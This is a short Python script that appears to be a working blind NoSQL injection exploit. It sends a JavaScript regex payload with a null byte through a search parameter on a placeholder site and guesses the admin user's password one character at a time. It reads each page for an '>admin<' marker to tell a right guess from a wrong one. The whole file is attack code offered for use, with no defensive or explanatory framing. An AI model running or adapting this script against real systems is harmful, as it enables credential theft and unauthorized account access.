import urllib.request
import  string

URL="https://website.com"

def check(payload):
    url=URL+"/?search=admin%27%26%26this.password%26%26this.password.match(/"+payload+"/)%00"
    print(url)
    resp=urllib.request.urlopen(url)
    data=resp.read()
    return ">admin<" in str(data)

#print(check("^5b"))
#print(check("^vssd.*$"))

CHARSET=list("-"+string.digits+string.ascii_letters)
password=""

while True:
    for c in CHARSET:
        print("Trying: "+c+" for "+password)
        test=password+c
        if check("^"+test+".*$"):
            password+=c
            print(password)
            break
        elif c==CHARSET[-1]:
            print(password)
            exit(0)
